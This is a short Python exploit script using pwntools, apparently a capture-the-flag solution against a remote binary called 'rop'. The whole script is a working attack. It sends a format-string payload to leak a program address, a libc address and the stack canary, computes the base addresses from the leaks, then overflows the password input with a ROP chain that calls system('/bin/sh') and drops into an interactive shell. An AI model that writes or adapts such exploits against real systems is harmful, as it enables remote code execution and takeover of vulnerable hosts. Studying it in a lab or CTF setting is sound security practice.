from pwn import *

elf = context.binary = ELF("./rop")
p = remote("143.244.138.133",8001)
# gdb.attach(p,"init-pwndbg")
libc = ELF("./libc.so.6")
p.recvuntil("Enter your username: ")
p.sendline("%13$p.%21$p^%15$p")

leak_1 = p.recvuntil(".")[6:-1]
leak_2 = p.recvuntil("^")[:-1]
leak_3 = p.recvline()

leak_1 = int(leak_1,16)
leak_2 = int(leak_2,16)
canary = int(leak_3,16)

elf.address = leak_1 - 0x94d
libc.address = leak_2 - 0x21c87
system = libc.sym.system
binsh = next(libc.search(b'/bin/sh'))
p.recvuntil("Please enter your password: ")

rop = ROP(elf)
ret = rop.find_gadget(["ret"])[0]
pop_rdi = rop.find_gadget(["pop rdi","ret"])[0]
payload = b'a'*72 + p64(canary)+b'a'*8+p64(ret)+p64(pop_rdi) + p64(binsh)+p64(system)

p.sendline(payload)
p.interactive()